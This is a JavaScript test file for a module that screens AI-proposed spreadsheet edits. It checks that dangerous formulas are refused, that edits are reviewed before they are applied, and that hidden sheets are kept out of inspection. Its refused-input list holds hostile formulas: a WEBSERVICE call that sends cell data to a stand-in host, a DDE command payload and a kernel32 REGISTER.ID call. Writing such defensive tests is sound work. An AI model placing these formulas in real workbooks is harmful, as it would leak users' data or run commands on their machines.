import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
	buildFile,
	checkFormulas,
	inspect,
	prepareChanges,
	reviewSpreadsheet,
	validateChanges,
} from './ai-operations.js';

const xlsxDoc = { id: 'd1', kind: 'xlsx', name: 'budget.xlsx', revision: 1 };
const cellChange = (input) => ({
	documentId: 'd1',
	type: 'cells',
	sheetIndex: 0,
	cells: [{ address: 'B2', input }],
});

// The forms a text filter let through: bare function references, storage prefixes, AI
// functions; and a new workbook, which was not screened at all.
const refusedInputs = [
	'=WEBSERVICE("https://example.test/?d="&A1)',
	'=webservice (A1)',
	'=MAP(A1,WEBSERVICE)',
	'=LET(f,WEBSERVICE,f(A1))',
	'=BYROW(A1:A2,FILTERXML)',
	'=_xlfn._xlws.WEBSERVICE(A1)',
	'=LET(h,HYPERLINK,h("x","y"))',
	'=+RTD("prog","","topic")',
	'=REGISTER.ID("kernel32","GetTickCount","J")',
	'=COPILOT("summarize",A1:A9)',
	'=TRANSLATE(A1,"en","fr")',
	'=STOCKHISTORY("MSFT",1)',
	'=_xlfn._xlws.PY("x",0)',
	'=CUBEVALUE("conn","m")',
	"=cmd|' /C calc'!A1",
	'=[1]Sheet1!A1',
	'=[budget.xlsx]Sheet1!A1',
	"=SUM('C:\\data\\[x.xlsx]S'!A1)",
];

test('checkFormulas refuses restricted formulas in edits and names the cell', async () => {
	for (const input of refusedInputs)
		await assert.rejects(
			checkFormulas({ changes: [cellChange(input)] }),
			/formula in B2 was rejected because it/,
			input,
		);
});

test('checkFormulas refuses them in a proposed new workbook too', async () => {
	const create = [
		{ type: 'docx', name: 'Brief', blocks: [{ type: 'paragraph', text: '=WEBSERVICE(A1)' }] },
		{
			type: 'xlsx',
			name: 'Report',
			sheets: [{ name: 'S', rows: [['secret', '=WEBSERVICE(A1)']] }],
		},
	];
	await assert.rejects(checkFormulas({ create }), /formula in S!B1 was rejected/);
	// Text in a Word document is not a formula.
	await assert.doesNotReject(checkFormulas({ create: create.slice(0, 1) }));
});

test('checkFormulas allows ordinary formulas and look-alike text', async () => {
	for (const input of [
		'=SUM(A1:A3)',
		'=IF(A1="http",1,0)',
		'="a|b"',
		'=_xlfn.XLOOKUP(A1,B:B,C:C)',
		'=Table1[Amount]',
		'=[@Amount]*2',
		'=MYIMAGE(A1)',
		'=A1&"image"',
		'plain text with IMAGE( and | pipes',
		'+WEBSERVICE(A1)',
		'42',
	])
		await assert.doesNotReject(checkFormulas({ changes: [cellChange(input)] }), input);
});

test('a restricted formula is refused when it is applied or built, whatever the card showed', async () => {
	const doc = await workbook();
	await assert.rejects(
		prepareChanges([cellChange('=MAP(A1,WEBSERVICE)')], [doc]),
		/B2: the formula was refused/,
	);
	await assert.rejects(
		buildFile({ type: 'xlsx', name: 'R', sheets: [{ name: 'S', rows: [['=WEBSERVICE(A1)']] }] }),
		/S!A1: the formula was refused/,
	);
});

test('validateChanges checks the shape of edits', () => {
	assert.doesNotThrow(() => validateChanges([cellChange('=SUM(A1:A3)')], [xlsxDoc]));
	assert.doesNotThrow(() => validateChanges([cellChange('12.5')], [xlsxDoc]));
	assert.throws(() => validateChanges([{ ...cellChange('1'), type: 'word_run' }], [xlsxDoc]));
});

test('inspect leaves hidden workbook content out unless the policy includes it', async () => {
	const { createXlsxFromSheets } = await import('ooxml-core/automation');
	const { loadXlsx, saveXlsx } = await import('ooxml-core/xlsx');
	const book = await loadXlsx(
		await createXlsxFromSheets([
			{ name: 'Public', rows: [['ok'], ['canary-row']] },
			{ name: 'Payroll', rows: [['canary-sheet', 90000]] },
		]),
	);
	book.sheets[1].state = 'veryHidden';
	book.sheets[0].rowInfo.set(1, { hidden: true });
	const bytes = await saveXlsx(book);
	const view = await inspect({ kind: 'xlsx', bytes });
	assert.doesNotMatch(JSON.stringify(view), /canary|Payroll/);
	assert.match(view.omitted, /1 hidden sheet was left out/);
	assert.match(view.omitted, /1 filled cell in hidden rows or columns was left out/);
	const all = await inspect({ kind: 'xlsx', bytes }, 150000, { includeHidden: true });
	assert.match(JSON.stringify(all), /canary-sheet/);
	assert.equal(all.omitted, undefined);
});

async function workbook() {
	const { createXlsxFromSheets } = await import('ooxml-core/automation');
	const bytes = await createXlsxFromSheets([{ name: 'Budget', rows: [[1, '=A1*2', '=B1+1']] }]);
	return { ...xlsxDoc, bytes };
}
const edit = (address, input) => ({
	documentId: 'd1',
	type: 'cells',
	sheetIndex: 0,
	cells: [{ address, input }],
});

test('reviewSpreadsheet lists the cells an edit recalculates, not the ones it types into', async () => {
	const doc = await workbook();
	const review = await reviewSpreadsheet([edit('A1', '5')], doc);
	assert.deepEqual(review.effects, [
		{ where: 'Budget', address: 'B1', before: '2', after: '10' },
		{ where: 'Budget', address: 'C1', before: '3', after: '11' },
	]);
	assert.equal(review.more, 0);
	assert.equal(review.proposal.format, 'xlsx');
	assert.deepEqual(await reviewSpreadsheet([], doc), { effects: [], more: 0 });
	const capped = await reviewSpreadsheet([edit('A1', '5')], doc, 1);
	assert.equal(capped.effects.length, 1);
	assert.equal(capped.more, 1);
});

test('prepareChanges saves the reviewed proposal and refuses bytes it was not made for', async () => {
	const { readXlsxRange } = await import('ooxml-core/automation');
	const doc = await workbook();
	const changes = [edit('A1', '5')];
	const { proposal } = await reviewSpreadsheet(changes, doc);
	const [next] = await prepareChanges(changes, [doc], { d1: proposal });
	assert.equal(next.revision, 2);
	const { cells } = await readXlsxRange(next.bytes, 0, 'A1:C1');
	assert.deepEqual(
		cells.map((c) => c.value),
		[5, 10, 11],
	);
	await assert.rejects(
		prepareChanges(changes, [{ ...doc, bytes: next.bytes }], { d1: proposal }),
		/document changed/,
	);
	// A different set of changes than the one reviewed is compared again and applied.
	const [other] = await prepareChanges([edit('A1', '7')], [doc], { d1: proposal });
	assert.deepEqual(
		(await readXlsxRange(other.bytes, 0, 'A1')).cells.map((c) => c.value),
		[7],
	);
});
